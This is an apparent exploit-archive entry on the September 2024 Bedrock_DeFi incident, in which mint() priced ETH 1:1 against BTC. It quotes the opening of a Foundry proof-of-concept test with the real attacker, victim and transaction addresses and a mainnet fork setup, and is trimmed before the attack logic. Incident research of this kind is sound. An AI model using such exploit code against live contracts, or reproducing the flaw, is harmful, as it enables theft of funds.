# [?] Bedrock_DeFi - Swap ETH/BTC 1/1 in mint function

## Summary
Severity: Unknown
Chain: Ethereum
Component: Bedrock_DeFi
Published: 2024-09-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bedrock_DeFi_exp.sol
Type: defi-exploit-poc

## Details
Lost: 27.83925883 BTC (~$1.7M USD)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~1.7M US$
// Attacker : https://etherscan.io/address/0x2bFB373017349820dda2Da8230E6b66739BE9F96
// Attack Contract : https://etherscan.io/address/0x0C8da4f8B823bEe4D5dAb73367D45B5135B50faB
// Created Attack Contract: https://etherscan.io/address/0x1E1d02D663228e5D47f1De64030B39632A3B787D
// Vulnerable Contract : https://etherscan.io/address/0x047D41F2544B7F63A8e991aF2068a363d210d6Da
// Attack Tx : https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901#code
// L2417-2420, mint() function

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contrasts involved
address constant uniBTC = 0x004E9C3EF86bc1ca1f0bB5C7662861Ee93350568;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

// Implementation: https://etherscan.io/address/0x702696b2aa47fd1d4feaaf03ce273009dc47d901#code
address constant VulVault = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;

contract Bedrock_DeFi_exp is Test {
    address attacker = makeAddr("attacker");
    Attacker attackerC;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_836_584 - 1);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bedrock_DeFi_exp.sol_
